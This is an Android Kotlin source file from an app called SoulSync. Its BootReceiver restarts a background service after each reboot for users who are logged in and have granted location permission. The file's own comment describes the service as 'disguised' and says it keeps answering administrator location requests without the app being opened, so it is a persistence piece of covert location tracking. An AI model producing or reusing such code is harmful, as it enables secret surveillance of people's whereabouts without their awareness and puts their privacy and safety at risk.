package com.soulsync.app

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.content.pm.PackageManager
import androidx.core.content.ContextCompat
import android.Manifest

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null) return
        // Only restart for a logged-in user who has granted location — otherwise
        // there's nothing to report and no reason to hold a foreground service.
        val prefs = context.getSharedPreferences("SoulSyncPrefs", Context.MODE_PRIVATE)
        if ((prefs.getString("jwt_token", "") ?: "").isEmpty()) return
        val fine = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION)
        val coarse = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION)
        if (fine != PackageManager.PERMISSION_GRANTED && coarse != PackageManager.PERMISSION_GRANTED) return

        // Bring the disguised foreground service back after a reboot so it can keep
        // answering admin on-demand location requests without the app being opened.
        val svc = Intent(context, SoulSyncService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, svc)
            } else {
                context.startService(svc)
            }
        } catch (e: Exception) { e.printStackTrace() }
    }
}
